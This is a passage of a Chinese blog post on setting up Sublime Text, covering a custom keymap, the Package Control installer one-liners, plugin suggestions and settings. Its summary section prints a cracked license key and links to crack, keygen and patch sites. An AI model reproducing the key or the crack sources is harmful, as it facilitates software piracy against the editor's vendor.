class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 常用快捷键(Sublime默认)</span></span><br><span class="line"><span class="comment">     * --------------</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * 光标一个单词一个单词的移动</span></span><br><span class="line"><span class="comment">     * &#123; &quot;keys&quot;: [&quot;super+left&quot;], &quot;command&quot;: &quot;move&quot;, &quot;args&quot;: &#123;&quot;by&quot;: &quot;words&quot;, &quot;forward&quot;: false&#125; &#125;,</span></span><br><span class="line"><span class="comment">     * 按住shift来选文字时, 一个个单词的选而不是一个个字母</span></span><br><span class="line"><span class="comment">     * &#123; &quot;keys&quot;: [&quot;super+shift+left&quot;], &quot;command&quot;: &quot;move&quot;, &quot;args&quot;: &#123;&quot;by&quot;: &quot;words&quot;, &quot;forward&quot;: false, &quot;extend&quot;: true&#125; &#125;,</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * 类似光标一个个单词的移动</span></span><br><span class="line"><span class="comment">     * &#123; &quot;keys&quot;: [&quot;alt+left&quot;], &quot;command&quot;: &quot;move&quot;, &quot;args&quot;: &#123;&quot;by&quot;: &quot;subwords&quot;, &quot;forward&quot;: false&#125; &#125;,</span></span><br><span class="line"><span class="comment">     * &#123; &quot;keys&quot;: [&quot;alt+shift+right&quot;], &quot;command&quot;: &quot;move&quot;, &quot;args&quot;: &#123;&quot;by&quot;: &quot;subword_ends&quot;, &quot;forward&quot;: true, &quot;extend&quot;: true&#125; &#125;,</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * 缩进</span></span><br><span class="line"><span class="comment">     * &#123; &quot;keys&quot;: [&quot;super+]&quot;], &quot;command&quot;: &quot;indent&quot; &#125;,</span></span><br><span class="line"><span class="comment">     * &#123; &quot;keys&quot;: [&quot;super+[&quot;], &quot;command&quot;: &quot;unindent&quot; &#125;,</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * 删除整个单词</span></span><br><span class="line"><span class="comment">     * &#123; &quot;keys&quot;: [&quot;super+backspace&quot;], &quot;command&quot;: &quot;delete_word&quot;, &quot;args&quot;: &#123; &quot;forward&quot;: false &#125; &#125;,</span></span><br><span class="line"><span class="comment">     * &#123; &quot;keys&quot;: [&quot;super+delete&quot;], &quot;command&quot;: &quot;delete_word&quot;, &quot;args&quot;: &#123; &quot;forward&quot;: true &#125; &#125;,</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * 行排序(例如选中几个JSON字段, 让这些字段名按字母顺序排序)</span></span><br><span class="line"><span class="comment">     * &#123; &quot;keys&quot;: [&quot;f9&quot;], &quot;command&quot;: &quot;sort_lines&quot;, &quot;args&quot;: &#123;&quot;case_sensitive&quot;: false&#125; &#125;,</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * 参考</span></span><br><span class="line"><span class="comment">     * ----------------------</span></span><br><span class="line"><span class="comment">     * Using Sublime Text as your IDE</span></span><br><span class="line"><span class="comment">     * http://www.chromium.org/developers/sublime-text</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Web Development With Sublime Text 2</span></span><br><span class="line"><span class="comment">     * http://www.paulund.co.uk/web-development-with-sublime-text-2</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// editor配置</span></span><br><span class="line">    &#123; <span class="attr">&quot;keys&quot;</span>: [<span class="string">&quot;super+v&quot;</span>], <span class="attr">&quot;command&quot;</span>: <span class="string">&quot;paste_and_indent&quot;</span> &#125;,</span><br><span class="line">    &#123; <span class="attr">&quot;keys&quot;</span>: [<span class="string">&quot;super+shift+v&quot;</span>], <span class="attr">&quot;command&quot;</span>: <span class="string">&quot;paste&quot;</span> &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 适配eclipse快捷键</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * 下面这位仁兄早就有了这个想法</span></span><br><span class="line"><span class="comment">     * Eclipse shortcuts for Sublime Text 2</span></span><br><span class="line"><span class="comment">     * http://icoloma.blogspot.com/2011/10/eclipse-shortcuts-for-sublime-text-2.html</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    &#123; <span class="attr">&quot;keys&quot;</span>: [<span class="string">&quot;alt+/&quot;</span>], <span class="attr">&quot;command&quot;</span>: <span class="string">&quot;auto_complete&quot;</span> &#125;,</span><br><span class="line">    &#123; <span class="attr">&quot;keys&quot;</span>: [<span class="string">&quot;super+i&quot;</span>], <span class="attr">&quot;command&quot;</span>: <span class="string">&quot;reindent&quot;</span> &#125;,</span><br><span class="line">    <span class="comment">// 当前行和下面一行交互位置</span></span><br><span class="line">    &#123; <span class="attr">&quot;keys&quot;</span>: [<span class="string">&quot;alt+up&quot;</span>], <span class="attr">&quot;command&quot;</span>: <span class="string">&quot;swap_line_up&quot;</span> &#125;,</span><br><span class="line">    &#123; <span class="attr">&quot;keys&quot;</span>: [<span class="string">&quot;alt+down&quot;</span>], <span class="attr">&quot;command&quot;</span>: <span class="string">&quot;swap_line_down&quot;</span> &#125;,</span><br><span class="line">    <span class="comment">// 复制当前行到上一行</span></span><br><span class="line">    &#123; <span class="attr">&quot;keys&quot;</span>: [<span class="string">&quot;super+alt+up&quot;</span>], <span class="attr">&quot;command&quot;</span>: <span class="string">&quot;duplicate_line&quot;</span> &#125;,</span><br><span class="line">    <span class="comment">// 复制当前行到下一行</span></span><br><span class="line">    &#123; <span class="attr">&quot;keys&quot;</span>: [<span class="string">&quot;super+alt+down&quot;</span>], <span class="attr">&quot;command&quot;</span>: <span class="string">&quot;duplicate_line&quot;</span> &#125;,</span><br><span class="line">    <span class="comment">// 删除整行</span></span><br><span class="line">    &#123; <span class="attr">&quot;keys&quot;</span>: [<span class="string">&quot;super+d&quot;</span>], <span class="attr">&quot;command&quot;</span>: <span class="string">&quot;run_macro_file&quot;</span>, <span class="attr">&quot;args&quot;</span>: &#123;<span class="attr">&quot;file&quot;</span>: <span class="string">&quot;Packages/Default/Delete Line.sublime-macro&quot;</span>&#125; &#125;,</span><br><span class="line">    <span class="comment">// 光标移动到指定行</span></span><br><span class="line">    &#123; <span class="attr">&quot;keys&quot;</span>: [<span class="string">&quot;super+l&quot;</span>], <span class="attr">&quot;command&quot;</span>: <span class="string">&quot;show_overlay&quot;</span>, <span class="attr">&quot;args&quot;</span>: &#123;<span class="attr">&quot;overlay&quot;</span>: <span class="string">&quot;goto&quot;</span>, <span class="attr">&quot;text&quot;</span>: <span class="string">&quot;:&quot;</span>&#125; &#125;,</span><br><span class="line">    <span class="comment">// 快速定位到选中的文字</span></span><br><span class="line">    &#123; <span class="attr">&quot;keys&quot;</span>: [<span class="string">&quot;super+k&quot;</span>], <span class="attr">&quot;command&quot;</span>: <span class="string">&quot;find_under_expand_skip&quot;</span> &#125;,</span><br><span class="line">    <span class="comment">// &#123; &quot;keys&quot;: [&quot;super+shift+x&quot;], &quot;command&quot;: &quot;swap_case&quot; &#125;,</span></span><br><span class="line">    &#123; <span class="attr">&quot;keys&quot;</span>: [<span class="string">&quot;super+shift+x&quot;</span>], <span class="attr">&quot;command&quot;</span>: <span class="string">&quot;upper_case&quot;</span> &#125;,</span><br><span class="line">    &#123; <span class="attr">&quot;keys&quot;</span>: [<span class="string">&quot;super+shift+y&quot;</span>], <span class="attr">&quot;command&quot;</span>: <span class="string">&quot;lower_case&quot;</span> &#125;,</span><br><span class="line">    <span class="comment">// 在当前行的下一行插入空行(这时鼠标可以在当前行的任一位置, 不一定是最后)</span></span><br><span class="line">    &#123; <span class="attr">&quot;keys&quot;</span>: [<span class="string">&quot;shift+enter&quot;</span>], <span class="attr">&quot;command&quot;</span>: <span class="string">&quot;run_macro_file&quot;</span>, <span class="attr">&quot;args&quot;</span>: &#123;<span class="attr">&quot;file&quot;</span>: <span class="string">&quot;Packages/Default/Add Line.sublime-macro&quot;</span>&#125; &#125;,</span><br><span class="line">    <span class="comment">// 定位到对于的匹配符(譬如&#123;&#125;)(从前面定位后面时,光标要在匹配符里面,后面到前面,则反之)</span></span><br><span class="line">    &#123; <span class="attr">&quot;keys&quot;</span>: [<span class="string">&quot;super+shift+p&quot;</span>], <span class="attr">&quot;command&quot;</span>: <span class="string">&quot;move_to&quot;</span>, <span class="attr">&quot;args&quot;</span>: &#123;<span class="attr">&quot;to&quot;</span>: <span class="string">&quot;brackets&quot;</span>&#125; &#125;,</span><br><span class="line">    <span class="comment">// 这个命令默认使用的是super+shift+p</span></span><br><span class="line">    &#123; <span class="attr">&quot;keys&quot;</span>: [<span class="string">&quot;super+p&quot;</span>], <span class="attr">&quot;command&quot;</span>: <span class="string">&quot;show_overlay&quot;</span>, <span class="attr">&quot;args&quot;</span>: &#123;<span class="attr">&quot;overlay&quot;</span>: <span class="string">&quot;command_palette&quot;</span>&#125; &#125;,</span><br><span class="line">    <span class="comment">// outline</span></span><br><span class="line">    &#123; <span class="attr">&quot;keys&quot;</span>: [<span class="string">&quot;super+o&quot;</span>], <span class="attr">&quot;command&quot;</span>: <span class="string">&quot;show_overlay&quot;</span>, <span class="attr">&quot;args&quot;</span>: &#123;<span class="attr">&quot;overlay&quot;</span>: <span class="string">&quot;goto&quot;</span>, <span class="attr">&quot;text&quot;</span>: <span class="string">&quot;@&quot;</span>&#125; &#125;,</span><br><span class="line">    <span class="comment">// 当前文件中的关键字(方便快速查找内容)</span></span><br><span class="line">    &#123; <span class="attr">&quot;keys&quot;</span>: [<span class="string">&quot;super+alt+o&quot;</span>], <span class="attr">&quot;command&quot;</span>: <span class="string">&quot;show_overlay&quot;</span>, <span class="attr">&quot;args&quot;</span>: &#123;<span class="attr">&quot;overlay&quot;</span>: <span class="string">&quot;goto&quot;</span>, <span class="attr">&quot;text&quot;</span>: <span class="string">&quot;#&quot;</span>&#125; &#125;,</span><br><span class="line">    <span class="comment">// open resource</span></span><br><span class="line">    &#123; <span class="attr">&quot;keys&quot;</span>: [<span class="string">&quot;super+shift+r&quot;</span>], <span class="attr">&quot;command&quot;</span>: <span class="string">&quot;show_overlay&quot;</span>, <span class="attr">&quot;args&quot;</span>: &#123;<span class="attr">&quot;overlay&quot;</span>: <span class="string">&quot;goto&quot;</span>, <span class="attr">&quot;show_files&quot;</span>: <span class="literal">true</span>&#125; &#125;,</span><br><span class="line">    <span class="comment">// 文件内查找/替换</span></span><br><span class="line">    &#123; <span class="attr">&quot;keys&quot;</span>: [<span class="string">&quot;super+f&quot;</span>], <span class="attr">&quot;command&quot;</span>: <span class="string">&quot;show_panel&quot;</span>, <span class="attr">&quot;args&quot;</span>: &#123;<span class="attr">&quot;panel&quot;</span>: <span class="string">&quot;replace&quot;</span>&#125; &#125;,</span><br><span class="line">    <span class="comment">// 全局查找/替换, 在查询结果中双击跳转到匹配位置</span></span><br><span class="line">    &#123;<span class="attr">&quot;keys&quot;</span>: [<span class="string">&quot;super+h&quot;</span>], <span class="attr">&quot;command&quot;</span>: <span class="string">&quot;show_panel&quot;</span>, <span class="attr">&quot;args&quot;</span>: &#123;<span class="attr">&quot;panel&quot;</span>: <span class="string">&quot;find_in_files&quot;</span>&#125; &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// plugin配置</span></span><br><span class="line">    &#123; <span class="attr">&quot;keys&quot;</span>: [<span class="string">&quot;alt+a&quot;</span>], <span class="attr">&quot;command&quot;</span>: <span class="string">&quot;alignment&quot;</span> &#125;,</span><br><span class="line">    &#123;<span class="attr">&quot;keys&quot;</span>: [<span class="string">&quot;super+shift+f&quot;</span>], <span class="attr">&quot;command&quot;</span>: <span class="string">&quot;js_format&quot;</span>&#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h2 id="三、插件"><a href="#三、插件" class="headerlink" title="三、插件"></a>三、插件</h2><h3 id="1-Package-Control"><a href="#1-Package-Control" class="headerlink" title="1. Package Control"></a>1. Package Control</h3><p>最简单的方式是通过 ctrl+`快捷键打开控制台，粘贴以下代码到控制台执行。<br>参见：<a href="https://packagecontrol.io/installation#st3">Package Control INSTALLATION</a></p><h4 id="Sublime-Text-3"><a href="#Sublime-Text-3" class="headerlink" title="Sublime Text 3"></a>Sublime Text 3</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request,os,hashlib; h = <span class="string">&#x27;2915d1851351e5ee549c20394736b442&#x27;</span> + <span class="string">&#x27;8bc59f460fa1548d1514676163dafc88&#x27;</span>; pf = <span class="string">&#x27;Package Control.sublime-package&#x27;</span>; ipp = sublime.installed_packages_path(); urllib.request.install_opener( urllib.request.build_opener( urllib.request.ProxyHandler()) ); by = urllib.request.urlopen( <span class="string">&#x27;http://packagecontrol.io/&#x27;</span> + pf.replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;%20&#x27;</span>)).read(); dh = hashlib.sha256(by).hexdigest(); <span class="built_in">print</span>(<span class="string">&#x27;Error validating download (got %s instead of %s), please try manual install&#x27;</span> % (dh, h)) <span class="keyword">if</span> dh != h <span class="keyword">else</span> <span class="built_in">open</span>(os.path.join( ipp, pf), <span class="string">&#x27;wb&#x27;</span> ).write(by)</span><br></pre></td></tr></table></figure><h4 id="Sublime-Text-2"><a href="#Sublime-Text-2" class="headerlink" title="Sublime Text 2"></a>Sublime Text 2</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib2,os,hashlib; h = <span class="string">&#x27;2915d1851351e5ee549c20394736b442&#x27;</span> + <span class="string">&#x27;8bc59f460fa1548d1514676163dafc88&#x27;</span>; pf = <span class="string">&#x27;Package Control.sublime-package&#x27;</span>; ipp = sublime.installed_packages_path(); os.makedirs( ipp ) <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(ipp) <span class="keyword">else</span> <span class="literal">None</span>; urllib2.install_opener( urllib2.build_opener( urllib2.ProxyHandler()) ); by = urllib2.urlopen( <span class="string">&#x27;http://packagecontrol.io/&#x27;</span> + pf.replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;%20&#x27;</span>)).read(); dh = hashlib.sha256(by).hexdigest(); <span class="built_in">open</span>( os.path.join( ipp, pf), <span class="string">&#x27;wb&#x27;</span> ).write(by) <span class="keyword">if</span> dh == h <span class="keyword">else</span> <span class="literal">None</span>; <span class="built_in">print</span>(<span class="string">&#x27;Error validating download (got %s instead of %s), please try manual install&#x27;</span> % (dh, h) <span class="keyword">if</span> dh != h <span class="keyword">else</span> <span class="string">&#x27;Please restart Sublime Text to finish installation&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="2-实用插件"><a href="#2-实用插件" class="headerlink" title="2. 实用插件"></a>2. 实用插件</h3><ul><li>SideBarEnhancements左侧菜单栏增强</li><li>ConvertToUTF8</li><li>AutoFileName自动补全文件(目录)名</li><li>BracketHighlighter突出显示括号/引号</li><li>ColorHighlighter 背景显示16进制颜色</li><li>DocBlockr 生成注释模板</li><li>Sublime CodeIntel – 智能代码提示</li><li>FreeMarker:Freemarker模板语言辅助</li><li>SublimeCodeIntel 代码提示</li><li>JSHint、JsFormart、jQuery</li><li>Color Highlighter</li><li>Indent XML</li><li>sublimeLinter</li><li>pretty json</li></ul><p>参见：</p><ul><li><a href="http://blog.csdn.net/xby1993/article/details/23995667">sublime Text3配置及快捷键、插件推荐总结</a></li><li><a href="http://blog.useasp.net/archive/2013/06/14/sublime-text-2-all-default-Shortcuts-table-on-windows-translated-with-chinese.aspx">SublimeText2 快捷键一览表</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;img src=&quot;/asserts/images/logo/sublime.png&quot; class=&quot;img-logo img-center&quot; /&gt;

&lt;h2 id=&quot;一、前言&quot;&gt;&lt;a href=&quot;#一、前言&quot; class=&quot;headerlink&quot; title=&quot;一、前言&quot;&gt;&lt;/a&gt;一、前言&lt;/h2&gt;&lt;h3 id=&quot;1-下载与破解&quot;&gt;&lt;a href=&quot;#1-下载与破解&quot; class=&quot;headerlink&quot; title=&quot;1. 下载与破解&quot;&gt;&lt;/a&gt;1. 下载与破解&lt;/h3&gt;&lt;p&gt;当前可用的破解码如下：&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;—– BEGIN LICENSE —–&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Andrew Weber&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Single User License&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;EA7E-855605&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;813A03DD 5E4AD9E6 6C0EEB94 BC99798F&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;942194A6 02396E98 E62C9979 4BB979FE&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;91424C9D A45400BF F6747D88 2FB88078&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;90F5CC94 1CDC92DC 8457107A F151657B&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;1D22E383 A997F016 42397640 33F41CFC&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;E1D0AE85 A0BBD039 0E9C8D55 E1B89D5D&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5CDB7036 E56DE1C0 EFCC0840 650CD3A6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;B98FC99C 8FAC73EE D2B95564 DF450523&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;—— END LICENSE ——&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;参见：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://www.xiumu.org/note/sublime-text-3.shtml&quot;&gt;Sublime Text 3 破解版 + 注册机 + 汉化包 + 教程&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.waitsun.com/sublime-text-3-for-mac.html&quot;&gt;Sublime Text 3 for Mac 3075 破解版 – Mac上强大的代码编辑神器&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.shuax.com/archives/SublimeText3Crack.html&quot;&gt;Sublime Text 3破解补丁&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;2-Sublime-Text-2与Sublime-Text-3区别&quot;&gt;&lt;a href=&quot;#2-Sublime-Text-2与Sublime-Text-3区别&quot; class=&quot;headerlink&quot; title=&quot;2. Sublime Text 2与Sublime Text 3区别&quot;&gt;&lt;/a&gt;2. Sublime Text 2与Sublime Text 3区别&lt;/h3&gt;&lt;p&gt;简单的说：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ST3支持在项目目录里面寻找变量提供了&lt;/li&gt;
&lt;li&gt;对标签页更好地支持（更多的命令和快捷键）&lt;/li&gt;
&lt;li&gt;加快了程序运行的速度&lt;/li&gt;
&lt;li&gt;更新了API，使用Python3.3&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;参见：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.zhihu.com/question/25078353&quot;&gt;Sublime Text3与Sublime Text 2的区别在哪里？&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://tutorial.jingwentian.com/Sublime-Text-3-Documentation/porting_guide.html&quot;&gt;Sublime Text 3 文档之迁移指南&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;二、配置&quot;&gt;&lt;a href=&quot;#二、配置&quot; class=&quot;headerlink&quot; title=&quot;二、配置&quot;&gt;&lt;/a&gt;二、配置&lt;/h2&gt;&lt;h3 id=&quot;1-我的配置&quot;&gt;&lt;a href=&quot;#1-我的配置&quot; class=&quot;headerlink&quot; title=&quot;1. 我的配置&quot;&gt;&lt;/a&gt;1. 我的配置&lt;/h3&gt;&lt;figure class=&quot;highlight json&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;attr&quot;&gt;&amp;quot;ignored_packages&amp;quot;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	[&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;string&quot;&gt;&amp;quot;Vintage&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	],&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;comment&quot;&gt;// 字体&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;attr&quot;&gt;&amp;quot;font_size&amp;quot;&lt;/span&gt;: &lt;span class=&quot;number&quot;&gt;12&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;comment&quot;&gt;// 高亮当前行&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;attr&quot;&gt;&amp;quot;highlight_line&amp;quot;&lt;/span&gt;: &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;comment&quot;&gt;// 新标签页打开文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;attr&quot;&gt;&amp;quot;preview_on_click&amp;quot;&lt;/span&gt;: &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;comment&quot;&gt;//滚动能否超过结尾&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;attr&quot;&gt;&amp;quot;scroll_past_end&amp;quot;&lt;/span&gt;: &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;comment&quot;&gt;// TAB缩进宽度&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;attr&quot;&gt;&amp;quot;tab_size&amp;quot;&lt;/span&gt;: &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;comment&quot;&gt;// 自动转换TAB为空格&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;attr&quot;&gt;&amp;quot;translate_tabs_to_spaces&amp;quot;&lt;/span&gt;: &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;comment&quot;&gt;// 皮肤&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;attr&quot;&gt;&amp;quot;theme&amp;quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&amp;quot;Soda Dark 3.sublime-theme&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;comment&quot;&gt;// 关闭自动更新&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span 